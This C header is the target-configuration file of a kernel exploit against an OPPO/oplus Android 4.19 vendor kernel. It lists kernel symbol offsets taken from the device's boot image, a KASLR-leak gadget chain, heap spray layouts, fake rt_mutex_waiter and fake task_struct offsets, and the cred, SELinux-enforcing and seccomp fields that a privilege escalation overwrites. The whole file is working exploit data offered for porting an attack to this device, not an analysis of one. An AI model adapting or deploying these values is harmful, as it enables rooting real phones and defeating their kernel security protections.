#ifndef TARGET_H
#define TARGET_H

/*
 * Target: OPPO/oplus vendor kernel 4.19.157-perf-g9607d8651312 (aarch64)
 *   banner : Linux version 4.19.157-perf-g9607d8651312
 *            (builder@pangu-build-component-vendor-163337-twtsj-c9c61-g70xg)
 *            #1 SMP PREEMPT Wed Oct 11 07:34:29 UTC 2023, clang 10.0.7
 *   boot hdr: ANDROID! v3, os_version 13.0.0, patch 2023-10
 * Provenance: every value below is extracted from the target boot.img
 *   (kallsyms / ikheaders / RELA table), NOT copied from Pixel targets.
 *   See analysis/logs/step*.json for machine-readable evidence.
 *
 * Confidence tags:
 *   [A] kallsyms-direct (symbol address from kernel's own kallsyms)
 *   [B] struct-layout engine validated by RELA-table + scalar anchors
 *   [C] 4.19 upstream definition (version-stable struct)
 *   [D] assumption -> must be confirmed at runtime (round 2)
 */

#define BUILD_VARIANT_LABEL "oplus_4.19.157_perf_a13"
#ifndef BUILD_FINGERPRINT
/* device fingerprint TBD at runtime (drive.txt proven untrustworthy) */
#define BUILD_FINGERPRINT "oplus/unknown/unknown:13/RKQ1.xxx/xxx:user/release-keys"
#endif

/* ---------------- address space ---------------- */
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL          /* [A] kallsyms _text */
#define P0_PAGE_OFFSET 0xffffff8000000000ULL            /* [A] 39-bit VA (CONFIG_ARM64_VA_BITS_39) */
#define P0_PHYS_OFFSET 0x80000000ULL                    /* [D] qcom standard; verify /proc/iomem */
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL               /* [B] PHYS + Image text_offset 0x80000 */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL /* [B] 16GB window (K40 6/8/12GB RAM) */
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffffc000000000ULL            /* [B] 16GB */
#define VMEMMAP_START 0xffffffbc00000000ULL             /* [B] 4.19 39-bit layout (NOT 6.x 0xfffffffe..) */

#define PSELECT_WAITER_WORD_SHIFT 1                     /* [D] stack-frame tuning, confirm at runtime */

/* ---------------- round-2 adaptation switches ---------------- */
#define CFGOPS_4_19_STYLE 1        /* put configfs_read_file/write_bin_file at .read/.write (not iter) */
#define KMALLOC_419 1              /* 3 cache types (NORMAL/RECLAIM/DMA), no cg caches */
#define KMALLOC_PIPE_INDEX 10      /* legacy pipe 16-slot bufs array: 16*0x28=640B -> kmalloc-1024 */
#define KMALLOC_PIPE_OBJ_SIZE 0x400
#define KMALLOC_CACHE_TYPES 3      /* 4.19 NR_KMALLOC_TYPES */
#define ASHMEM_NAME_PREFIX_LEN 0   /* this kernel's ashmem has NO "/dev/ashmem" prefix (binary-verified) */
#define ASHMEM_PREFIX_COUNT 0      /* 6.x prefix arithmetic disabled on 4.19 */
/* on-device verified: mm_cachep object size == 0x340 (found via retry). */
#define MM_STRUCT_SZ 0x340

/* KASLR leak: direct /proc/kallsyms + dmesg are tried first (CFGOPS_4_19_STYLE
 * disables the boot_id rb-gadget, which needs per-build values and would panic
 * with the placeholder SLIDE_LOGGERS_0_1 / SLIDE_RANDOM_BOOT_ID_DATA). */

/* ---------------- symbol offsets (off = sym - KIMAGE_TEXT_BASE) ---------------- */
#define ASHMEM_MISC_FOPS_OFF 0x02ed2c60ULL              /* [A] ashmem_misc + 0x10 = miscdevice.fops slot */
#define ASHMEM_FOPS_OFF 0x020be968ULL                   /* [A] ashmem_fops */
#define ASHMEM_IOCTL_OFF 0x00c44c20ULL                  /* [A] ashmem_ioctl */
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c45550ULL           /* [A] compat_ashmem_ioctl (4.19 name) */
#define ASHMEM_MMAP_OFF 0x00c455a0ULL                   /* [A] ashmem_mmap */
#define ASHMEM_OPEN_OFF 0x00c45718ULL                   /* [A] ashmem_open */
#define ASHMEM_RELEASE_OFF 0x00c45790ULL                /* [A] ashmem_release */
#define ASHMEM_SHOW_FDINFO_OFF 0x00c458a8ULL            /* [A] ashmem_show_fdinfo */
#define CONFIGFS_READ_ITER_OFF 0x002f3138ULL            /* [A] configfs_read_file (4.19 has no read_iter) */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x002f3628ULL       /* [A] configfs_write_bin_file (4.19 name) */
#define COPY_SPLICE_READ_OFF 0x002838b0ULL              /* [A] generic_file_splice_read (4.19 substitute) */
#define NOOP_LLSEEK_OFF 0x002404b0ULL                   /* [A] noop_llseek */
#define INIT_TASK_OFF 0x02d9bfc0ULL                     /* [A] init_task */
#define INIT_UTS_NS_OFF 0x02d9bd68ULL                   /* [A] init_uts_ns */
#define EMPTY_ZERO_PAGE_OFF 0x0303d000ULL               /* [A] empty_zero_page */
#define ROOT_TASK_GROUP_OFF 0x03043d80ULL               /* [A] root_task_group */
/* SELINUX_BLOB_SIZES: N/A on 4.19 - cred->security points directly at
 * task_security_struct; keep SELINUX_CRED_BLOB_OFF 0 below. */
#define SELINUX_ENFORCING_OFF 0x03b05000ULL             /* [A] selinux_state; enforcing at +0 (DEVELOP=y, DISABLE=n) */
#define SECURITY_HOOK_HEADS_OFF 0x0267b448ULL           /* [A] security_hook_heads */
#define KMALLOC_CACHES_OFF 0x0267af48ULL                /* [A] kmalloc_caches (4.19: 3 types NORMAL/RECLAIM/DMA - no CGROUP) */
#define ANON_PIPE_BUF_OPS_OFF 0x018e7440ULL             /* [A] anon_pipe_buf_ops */

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ---------------- KASLR-leak (slide) gadget ----------------
 * nfulnl_logger / sysctl_bootid exist [A]; the Pixel leak chain
 * (LOGGERS_0_1 / RANDOM_BOOT_ID_DATA) is 6.x-specific -> rework required. */
#define SLIDE_NFULNL_LOGGER_OFF 0x02d922e0ULL           /* [A] nfulnl_logger */
#define SLIDE_SYSCTL_BOOTID_OFF 0x032de2c4ULL           /* [A] sysctl_bootid */
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
/* [B] loggers[0][0] (nf_log.c) == nfulnl_logger - 0xd8; content = &nfulnl_logger
 *     (nfnetlink_log registers NFPROTO_UNSPEC). RELA-verified boot_id sysctl
 *     entry .data slot = 0x2e33f68 (proc_do_uuid outputs table->data content
 *     when data[8]!=0 -> leaks the slid pointer). */
#define SLIDE_LOGGERS_0_1_OFF 0x02d92208ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02e33f68ULL
#define SLIDE_WONLY_BOOTID 1                            /* [D] confirm */

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------- exploit-internal spray layout (target-independent) ---------------- */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* ---------------- rt_mutex_waiter (4.19 form) ----------------
 * 4.19: {tree_entry@0, pi_tree_entry@0x18, task@0x30, lock@0x38,
 *        prio@0x40, deadline@0x48}, size 0x50. NO wake_state / ww_ctx. [C] */
#define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48
/* WAITER_WAKE_STATE_OFF / WAITER_WW_CTX_OFF do not exist on 4.19 */

/* fake waiter spray layout: keep their geometry, but kernel-consumed fields
 * must land at the 4.19 offsets above (payload rework in round 2). */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

/* ---------------- task_struct ---------------- [B, anchors: 13 RELA pins + 4 scalars] */
#define FAKE_TASK_USAGE_OFF 0x68
#define FAKE_TASK_PRIO_OFF 0xac
#define FAKE_TASK_NORMAL_PRIO_OFF 0xb4
#define FAKE_TASK_TASK_GROUP_OFF 0x3c8                  /* sched_task_group (CGROUP_SCHED) */
#define FAKE_TASK_PI_LOCK_OFF 0x8b4
#define FAKE_TASK_PI_WAITERS_OFF 0x8c0
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8d0
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8d8

#define TASK_PI_LOCK_OFF 0x8b4
#define TASK_PI_WAITERS_OFF 0x8c0
#define TASK_PI_TOP_TASK_OFF 0x8d0
#define TASK_PI_BLOCKED_ON_OFF 0x8d8

#define MM_OWNER_OFF 0x310                              /* mm_struct.owner */
#define TASK_PID_OFF 0x638
#define TASK_TGID_OFF 0x63c
#define TASK_REAL_PARENT_OFF 0x648
#define TASK_ATOMIC_FLAGS_OFF 0x600
#define TASK_REAL_CRED_OFF 0x7e0
#define TASK_CRED_OFF 0x7e8
#define TASK_COMM_OFF 0x7f0
#define TASK_TASKS_OFF 0x538
#define TASK_THREAD_GROUP_OFF 0x6e8
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x890

/* ---------------- configfs_buffer (4.19, fs/configfs/file.c) ---------------- [C] */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 64
#define CFG_BIN_BUFFER_OFF 72
#define CFG_BIN_BUFFER_SIZE_OFF 80
#define CFG_CB_MAX_SIZE_OFF 84

/* ---------------- cred / seccomp / selinux ---------------- [B anchors: caps pattern] */
#define CRED_UID_OFF 4
#define CRED_SECUREBITS_OFF 36
#define CRED_CAPS_OFF 40                                /* cap_inheritable */
#define CRED_SECURITY_OFF 120                           /* 0x78 */
#define SELINUX_CRED_BLOB_OFF 0                         /* 4.19: direct task_security_struct* */
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_OFF 0x08
/* SECCOMP_FILTER_COUNT_OFF: N/A on 4.19 (count lives in seccomp_filter, not seccomp) */
#define TIF_SECCOMP_BIT 11                              /* [A] arm64 thread_info.h */
#define PFA_NO_NEW_PRIVS_BIT 0

/* ---------------- struct page ---------------- [C] */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

/* ---------------- pipe (LEGACY pre-4.9 layout - vendor quirk!) ----------------
 * This kernel ships legacy pipe_inode_info:
 * { mutex@0; wait@0x20; nrbufs@0x38; curbuf@0x3c; buffers@0x40;
 *   readers@0x44; writers@0x48; files@0x4c; waiting_writers@0x50;
 *   r_counter@0x54; w_counter@0x58; tmp_page@0x60;
 *   fasync_readers@0x68; fasync_writers@0x70; bufs@0x78; user@0x80 } size 0x88
 * 6.x ring fields (PIPE_HEAD_OFF/PIPE_TAIL_OFF/PIPE_RING_SIZE_OFF...) do NOT exist. [B] */
#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 16                            /* legacy PIPE_DEF_BUFFERS */
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_INODE_INFO_STRUCT_SIZE 0x88
#define PIPE_INODE_INFO_SIZE 0x88
#define PIPE_NRBUFS_OFF 0x38
#define PIPE_CURBUF_OFF 0x3c
#define PIPE_BUFFERS_OFF 0x40
#define PIPE_READERS_OFF 0x44
#define PIPE_WRITERS_OFF 0x48
#define PIPE_FILES_OFF 0x4c
#define PIPE_TMP_PAGE_OFF 0x60
#define PIPE_BUFS_OFF 0x78
#define PIPE_USER_OFF 0x80

/* ---------------- file_operations (4.19) ---------------- [B] */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xc0
#define FOPS_SHOW_FDINFO_OFF 0xd8

#endif
